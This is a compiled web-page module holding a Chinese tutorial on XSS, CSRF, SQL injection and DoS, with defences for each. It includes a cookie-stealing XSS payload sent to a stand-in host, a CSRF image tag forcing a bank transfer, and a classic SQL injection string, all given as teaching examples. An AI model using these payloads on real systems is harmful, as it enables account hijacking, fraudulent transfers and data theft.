import{_ as p,r as o,o as i,c as l,a,b as s,d as t,e}from"./app-pMbPEaNl.js";const c={},r=e(`<h1 id="攻击技术" tabindex="-1"><a class="header-anchor" href="#攻击技术" aria-hidden="true">#</a> 攻击技术</h1><h2 id="一、跨站脚本攻击" tabindex="-1"><a class="header-anchor" href="#一、跨站脚本攻击" aria-hidden="true">#</a> 一、跨站脚本攻击</h2><h3 id="概念" tabindex="-1"><a class="header-anchor" href="#概念" aria-hidden="true">#</a> 概念</h3><p>跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。</p><h3 id="攻击原理" tabindex="-1"><a class="header-anchor" href="#攻击原理" aria-hidden="true">#</a> 攻击原理</h3><p>例如有一个论坛网站，攻击者可以在上面发布以下内容：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">&quot;//domain.com/?c=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>之后该内容可能会被渲染成以下形式：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">&quot;//domain.com/?c=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。</p><h3 id="危害" tabindex="-1"><a class="header-anchor" href="#危害" aria-hidden="true">#</a> 危害</h3><ul><li>窃取用户的 Cookie</li><li>伪造虚假的输入表单骗取个人信息</li><li>显示伪造的文章或者图片</li></ul><h3 id="防范手段" tabindex="-1"><a class="header-anchor" href="#防范手段" aria-hidden="true">#</a> 防范手段</h3><h4 id="_1-设置-cookie-为-httponly" tabindex="-1"><a class="header-anchor" href="#_1-设置-cookie-为-httponly" aria-hidden="true">#</a> 1. 设置 Cookie 为 HttpOnly</h4><p>设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。</p><h4 id="_2-过滤特殊字符" tabindex="-1"><a class="header-anchor" href="#_2-过滤特殊字符" aria-hidden="true">#</a> 2. 过滤特殊字符</h4><p>例如将 <code>&lt;</code> 转义为 <code>&amp;lt;</code>，将 <code>&gt;</code> 转义为 <code>&amp;gt;</code>，从而避免 HTML 和 Jascript 代码的运行。</p><p>富文本编辑器允许用户输入 HTML 代码，就不能简单地将 <code>&lt;</code> 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。</p><p>富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。</p><p>以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>title<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>XSS Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>q<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>test<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/javascript<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
<span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">xss</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>XSS Demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token entity named-entity" title="&lt;">&amp;lt;</span>form<span class="token entity named-entity" title="&gt;">&amp;gt;</span>
  <span class="token entity named-entity" title="&lt;">&amp;lt;</span>input type=&quot;text&quot; name=&quot;q&quot; value=&quot;test&quot;<span class="token entity named-entity" title="&gt;">&amp;gt;</span>
<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/form<span class="token entity named-entity" title="&gt;">&amp;gt;</span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">&gt;</span></span>hello<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">&gt;</span></span>

<span class="token entity named-entity" title="&lt;">&amp;lt;</span>script type=&quot;text/javascript&quot;<span class="token entity named-entity" title="&gt;">&amp;gt;</span>
alert(/xss/);
<span class="token entity named-entity" title="&lt;">&amp;lt;</span>/script<span class="token entity named-entity" title="&gt;">&amp;gt;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,22),u={href:"http://jsxss.com/zh/try.html",target:"_blank",rel:"noopener noreferrer"},d=e(`<h2 id="二、跨站请求伪造" tabindex="-1"><a class="header-anchor" href="#二、跨站请求伪造" aria-hidden="true">#</a> 二、跨站请求伪造</h2><h3 id="概念-1" tabindex="-1"><a class="header-anchor" href="#概念-1" aria-hidden="true">#</a> 概念</h3><p>跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。</p><p>XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。</p><h3 id="攻击原理-1" tabindex="-1"><a class="header-anchor" href="#攻击原理-1" aria-hidden="true">#</a> 攻击原理</h3><p>假如一家银行用以执行转账操作的 URL 地址如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>那么，一个恶意攻击者可以在另一个网站上放置如下代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。</p><p>这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。</p><p>通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。</p><h3 id="防范手段-1" tabindex="-1"><a class="header-anchor" href="#防范手段-1" aria-hidden="true">#</a> 防范手段</h3><h4 id="_1-检查-referer-首部字段" tabindex="-1"><a class="header-anchor" href="#_1-检查-referer-首部字段" aria-hidden="true">#</a> 1. 检查 Referer 首部字段</h4><p>Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。</p><p>这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。</p><h4 id="_2-添加校验-token" tabindex="-1"><a class="header-anchor" href="#_2-添加校验-token" aria-hidden="true">#</a> 2. 添加校验 Token</h4><p>在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。</p><h4 id="_3-输入验证码" tabindex="-1"><a class="header-anchor" href="#_3-输入验证码" aria-hidden="true">#</a> 3. 输入验证码</h4><p>因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。</p><h2 id="三、sql-注入攻击" tabindex="-1"><a class="header-anchor" href="#三、sql-注入攻击" aria-hidden="true">#</a> 三、SQL 注入攻击</h2><h3 id="概念-2" tabindex="-1"><a class="header-anchor" href="#概念-2" aria-hidden="true">#</a> 概念</h3><p>服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。</p><h3 id="攻击原理-2" tabindex="-1"><a class="header-anchor" href="#攻击原理-2" aria-hidden="true">#</a> 攻击原理</h3><p>例如一个网站登录验证的 SQL 查询代码为：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>strSQL <span class="token operator">=</span> <span class="token string">&quot;SELECT * FROM users WHERE (name = &#39;&quot;</span> <span class="token operator">+</span> userName <span class="token operator">+</span> <span class="token string">&quot;&#39;) and (pw = &#39;&quot;</span><span class="token operator">+</span> passWord <span class="token operator">+</span><span class="token string">&quot;&#39;);&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如果填入以下内容：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>userName <span class="token operator">=</span> <span class="token string">&quot;1&#39; OR &#39;1&#39;=&#39;1&quot;</span><span class="token punctuation">;</span>
passWord <span class="token operator">=</span> <span class="token string">&quot;1&#39; OR &#39;1&#39;=&#39;1&quot;</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>那么 SQL 查询字符串为：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>strSQL <span class="token operator">=</span> <span class="token string">&quot;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此时无需验证通过就能执行以下查询：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>strSQL <span class="token operator">=</span> <span class="token string">&quot;SELECT * FROM users;&quot;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="防范手段-2" tabindex="-1"><a class="header-anchor" href="#防范手段-2" aria-hidden="true">#</a> 防范手段</h3><h4 id="_1-使用参数化查询" tabindex="-1"><a class="header-anchor" href="#_1-使用参数化查询" aria-hidden="true">#</a> 1. 使用参数化查询</h4><p>Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token class-name">PreparedStatement</span> stmt <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span><span class="token string">&quot;SELECT * FROM users WHERE userid=? AND password=?&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
stmt<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> userid<span class="token punctuation">)</span><span class="token punctuation">;</span>
stmt<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> stmt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="_2-单引号转换" tabindex="-1"><a class="header-anchor" href="#_2-单引号转换" aria-hidden="true">#</a> 2. 单引号转换</h4><p>将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。</p><h2 id="四、拒绝服务攻击" tabindex="-1"><a class="header-anchor" href="#四、拒绝服务攻击" aria-hidden="true">#</a> 四、拒绝服务攻击</h2><p>拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。</p><p>分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。</p><h2 id="参考资料" tabindex="-1"><a class="header-anchor" href="#参考资料" aria-hidden="true">#</a> 参考资料</h2>`,42),k={href:"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC",target:"_blank",rel:"noopener noreferrer"},h={href:"https://zh.wikipedia.org/wiki/SQL%E8%B3%87%E6%96%99%E9%9A%B1%E7%A2%BC%E6%94%BB%E6%93%8A",target:"_blank",rel:"noopener noreferrer"},m={href:"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0",target:"_blank",rel:"noopener noreferrer"},g={href:"https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A",target:"_blank",rel:"noopener noreferrer"};function v(b,f){const n=o("ExternalLinkIcon");return i(),l("div",null,[r,a("blockquote",null,[a("p",null,[a("a",u,[s("XSS 过滤在线测试"),t(n)])])]),d,a("ul",null,[a("li",null,[a("a",k,[s("维基百科：跨站脚本"),t(n)])]),a("li",null,[a("a",h,[s("维基百科：SQL 注入攻击"),t(n)])]),a("li",null,[a("a",m,[s("维基百科：跨站点请求伪造"),t(n)])]),a("li",null,[a("a",g,[s("维基百科：拒绝服务攻击"),t(n)])])])])}const x=p(c,[["render",v],["__file","gongjijishu.html.vue"]]);export{x as default};
